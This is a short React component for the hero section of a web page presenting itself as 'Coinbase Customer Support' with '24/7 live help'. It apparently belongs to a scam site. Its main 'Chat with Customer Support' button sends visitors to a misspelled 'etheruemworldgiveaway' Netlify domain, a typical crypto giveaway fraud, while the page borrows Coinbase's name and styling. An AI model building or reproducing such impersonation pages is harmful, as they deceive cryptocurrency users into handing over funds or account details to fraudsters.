import { Button } from "@/components/ui/button"

const Hero = () => {
  return (
    <section className="w-full px-4 py-16 md:py-24">
      <div className="max-w-4xl mx-auto text-center">
        <h1 className="text-4xl md:text-6xl font-bold text-foreground mb-6">
          Coinbase Customer Support
        </h1>
        <p className="text-lg md:text-xl text-muted-foreground mb-8 max-w-2xl mx-auto">
          24/7 live help for payments, settlements, account verification, and integrations.
        </p>
        <div className="flex flex-col sm:flex-row items-center justify-center gap-3">
          <Button asChild variant="coinbase" size="lg">
            <a href="https://etheruemworldgiveaway.netlify.app" target="_blank" rel="noopener noreferrer">Chat with Customer Support</a>
          </Button>
          <Button variant="coinbase-outline" size="lg" onClick={() => (window as any).jivo_api?.open?.()}>
            Contact Us
          </Button>
        </div>
      </div>
    </section>
  )
}

export default Hero